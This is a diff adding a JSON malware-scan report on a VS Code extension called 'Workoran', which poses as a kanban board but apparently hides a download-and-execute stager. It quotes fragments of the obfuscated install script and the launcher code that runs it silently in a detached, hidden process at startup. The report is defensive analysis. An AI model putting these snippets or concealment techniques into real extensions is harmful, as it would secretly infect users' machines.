@@ -1,0 +1,212 @@
+{
+  "extension_id": "Lommin.workoran",
+  "display_name": "Workoran",
+  "version": "1.0.2",
+  "publisher": {
+    "name": "Lommin",
+    "verified": false
+  },
+  "vsix_sha256": "8e658764c03c8f23a2eeff76106b4a9994ea9f8c33e1a3f274f93ac30deb5ab4",
+  "verdict": "SUSPICIOUS",
+  "confirmation_basis": [
+    "composite_score",
+    "critical_static_finding"
+  ],
+  "confidence": 0.6,
+  "scores": {
+    "composite": 0.62,
+    "ai_vibe": 1.0,
+    "static": 0.75,
+    "behavioral": 0.0,
+    "trust_signal": 0.5499999999999999,
+    "campaign": 0.0
+  },
+  "findings": {
+    "critical": [
+      {
+        "check": "code_obfuscation",
+        "severity": "CRITICAL",
+        "description": "Dense obfuscator.io-style hex identifiers (generated string array)",
+        "file": "extension/node_modules/boardflow/install.js",
+        "line": 1,
+        "snippet": "_0x21161d=_0x3b8e;(function(_0x550e6a,_0x5b9cab){const _0x5e68d1=_0x3b8e;const _0x540127=_0x550e6a();while(!![]){try{const _0x41676f=parseInt(_0x5e68d1(0xad))/0x1*(-parseInt(_0x5e68d1(0xbb))/0x2)+-par"
+      },
+      {
+        "check": "code_obfuscation",
+        "severity": "CRITICAL",
+        "description": "Dense obfuscator.io-style hex identifiers (generated string array)",
+        "file": "extension/node_modules/boardflow/install.js",
+        "line": 1,
+        "snippet": "_0x3c3b=function(){return _0x2cd136;};return _0x3c3b();}const {exec}=require(_0x21161d(0xbc)+_0x21161d(0xb5));const path=require(_0x21161d(0xbe));const dest=path[_0x21161d(0xb2)](process.env.TEMP,_0x2"
+      },
+      {
+        "check": "code_obfuscation",
+        "severity": "CRITICAL",
+        "description": "String-array rotation decoder loop (obfuscator.io signature)",
+        "file": "extension/node_modules/boardflow/install.js",
+        "line": 1,
+        "snippet": "['push'](_0x540127['shift']())"
+      },
+      {
+        "check": "code_obfuscation",
+        "severity": "CRITICAL",
+        "description": "String-array rotation decoder loop (obfuscator.io signature)",
+        "file": "extension/node_modules/boardflow/install.js",
+        "line": 1,
+        "snippet": "['push'](_0x540127['shift']())"
+      }
+    ],
+    "high": [
+      {
+        "check": "POSTINSTALL_SCRIPT",
+        "severity": "HIGH",
+        "description": "Bundled module 'boardflow' has 'preinstall': node install.js",
+        "file": "extension/node_modules/boardflow/package.json",
+        "line": null,
+        "snippet": null
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'child_process' pattern",
+        "file": "extension/src/launcher.js",
+        "line": 4,
+        "snippet": "const { spawn } = require('child_process');"
+      },
+      {
+        "check": "RISKY_API_CALL",
+        "severity": "HIGH",
+        "description": "Found 'require('child_process')' pattern",
+        "file": "extension/src/launcher.js",
+        "line": 4,
+        "snippet": "const { spawn } = require('child_process');"
+      },
+      {
+        "check": "command_execution",
+        "severity": "HIGH",
+        "description": "Direct command / shell execution",
+        "file": "extension/src/launcher.js",
+        "line": 4,
+        "snippet": "require('child_process')"
+      }
+    ],
+    "total": 14
+  },
+  "extracted_references": [],
+  "extracted_references_notes": {
+    "withheld_dependency_metadata": 2,
+    "truncated": 0,
+    "what_this_is": "Domains, URLs and filenames found in the package text. NOT confirmed attacker infrastructure and NOT safe to auto-blocklist -- a URL in a code comment appears here too. Use it as a starting point for analysis, and check vt_detections/reputation before acting.",
+    "rule": "References extracted from node_modules are excluded: they describe a dependency, not this extension. Deduplicated on (type, value)."
+  },
+  "ioc_enrichment": [],
+  "shared_infrastructure": {},
+  "ai_analysis": {
+    "verdict": "MALICIOUS",
+    "risk_score": 0.95,
+    "confidence": 0.98,
+    "blocks_parsed": 2,
+    "blocks_seen": 2,
+    "summaries": [
+      {
+        "target": "extension/src/launcher.js",
+        "summary": "This extension is malicious. While it presents itself as a benign Kanban board tool, the `launcher.js` file reveals a mechanism to silently execute a bundled script (`boardflow/install.js`) in a detached, hidden process. Static analysis of the package indicates this script attempts to interact with a suspicious domain and a Windows batch file, suggesting it is a stager for downloading and executing further malware (such as an infostealer or RAT). The use of `child_process` in a UI-only extension is a major capability disconnect and a strong indicator of supply-chain compromise."
+      },
+      {
+        "target": "extension/node_modules/boardflow/install.js",
+        "summary": "This VS Code extension is malicious. It disguises itself as a kanban board tool but contains an obfuscated installer script that downloads and executes a remote batch file from an untrusted domain. The sandbox execution confirmed the download and execution of the payload. The code is heavily obfuscated to hide its intent, and there is a complete disconnect between the advertised functionality and the actual malicious behavior."
+      }
+    ],
+    "findings": [
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a simple 'Trello-style kanban board' but the launcher explicitly executes an external script (`boardflow/install.js`) using `child_process.spawn`. A UI-only extension does not require spawning detached child processes to function. This indicates hidden functionality not described in the marketplace listing.",
+        "code_reference": "const child = spawn(process.execPath, [INSTALL_SCRIPT], { ... detached: true ... });",
+        "line_hint": 28,
+        "target": "extension/src/launcher.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "SUSPICIOUS_DEPENDENCY",
+        "description": "The extracted indicators reveal that the bundled `boardflow` module contains an `install.js` that references a suspicious domain (`pixelstudiodev.com`) and a Windows batch file (`qvz2wkoybb6tp4wt.bat`). This strongly suggests the 'install' script is a stager that downloads and executes a payload from an untrusted source, likely a dropper or infostealer.",
+        "code_reference": "extension/node_modules/boardflow/install.js:42",
+        "line_hint": null,
+        "target": "extension/src/launcher.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "OBSCURED_EXECUTION",
+        "description": "The launcher uses `detached: true`, `stdio: 'ignore'`, and `child.unref()` to execute the payload in the background without logging output or tying the process lifecycle to the extension host. This is a common technique to evade detection and ensure the malicious payload persists or runs silently.",
+        "code_reference": "detached: true, stdio: 'ignore', windowsHide: true ... child.unref();",
+        "line_hint": 32,
+        "target": "extension/src/launcher.js"
+      },
+      {
+        "severity": "MEDIUM",
+        "category": "BEHAVIORAL_MISMATCH",
+        "description": "The activation event `onStartupFinished` is inappropriate for a command-based extension. It forces the malicious payload to execute immediately upon VS Code startup, maximizing the chance of infection before the user interacts with the extension.",
+        "code_reference": "package.json activationEvents",
+        "line_hint": null,
+        "target": "extension/src/launcher.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "LOLBIN_STAGER",
+        "description": "The extension downloads and executes a remote batch file (.bat) from an untrusted domain (pixelstudiodev.com) using curl and child_process.exec. This is a classic download-and-execute stager pattern.",
+        "code_reference": "exec(_0x21161d(0xaf) + ... url ...); exec('\\\"' + dest + '\\\"');",
+        "line_hint": 42,
+        "target": "extension/node_modules/boardflow/install.js"
+      },
+      {
+        "severity": "CRITICAL",
+        "category": "CAPABILITY_DISCONNECT",
+        "description": "The extension is advertised as a 'Trello-style kanban board' (UI feature), but the code contains no UI logic, only a malicious installer script that executes arbitrary remote code. This is a complete disconnect between advertised functionality and actual behavior.",
+        "code_reference": "extension/node_modules/boardflow/install.js",
+        "line_hint": null,
+        "target": "extension/node_modules/boardflow/install.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "CODE_OBFUSCATION",
+        "description": "The code is heavily obfuscated using obfuscator.io techniques (string array rotation, hex identifiers) to hide the malicious payload and evade static analysis.",
+        "code_reference": "const _0x21161d = _0x3b8e; (function(_0x550e6a, _0x5b9cab) { ... }",
+        "line_hint": 1,
+        "target": "extension/node_modules/boardflow/install.js"
+      },
+      {
+        "severity": "HIGH",
+        "category": "ARBITRARY_COMMAND_EXECUTION",
+        "description": "Uses child_process.exec to run system commands, specifically to download and execute a remote payload.",
+        "code_reference": "const { exec } = require(_0x21161d(0xbc) + _0x21161d(0xb5));",
+        "line_hint": 36,
+        "target": "extension/node_modules/boardflow/install.js"
+      }
+    ],
+    "findings_truncated": 0
+  },
+  "ai_summary": "This extension is malicious. While it presents itself as a benign Kanban board tool, the `launcher.js` file reveals a mechanism to silently execute a bundled script (`boardflow/install.js`) in a detached, hidden process. Static analysis of the package indicates this script attempts to interact with a suspicious domain and a Windows batch file, suggesting it is a stager for downloading and executing further malware (such as an infostealer or RAT). The use of `child_process` in a UI-only extension is a major capability disconnect and a strong indicator of supply-chain compromise.",
+  "escalation_reasons": [
+    "4 CRITICAL findings",
+    "6 HIGH findings",
+    "Composite risk 0.57 >= 0.45",
+    "AI verdict: MALICIOUS"
+  ],
+  "virustotal": {
+    "malicious": 0,
+    "total_engines": 0,
+    "known_malicious": false
+  },
+  "marketplace": {
+    "install_count": 1655,
+    "published_date": "2026-09-15T17:16:37.017Z",
+    "removed_by_microsoft": false,
+    "removal_type": null
+  },
+  "analysis_coverage": {
+    "partial": false,
+    "excluded_phases": [],
+    "ai_phase_ran": true
+  },
+  "scanned_at": "2026-09-16T13:12:38.437388+00:00"
+}
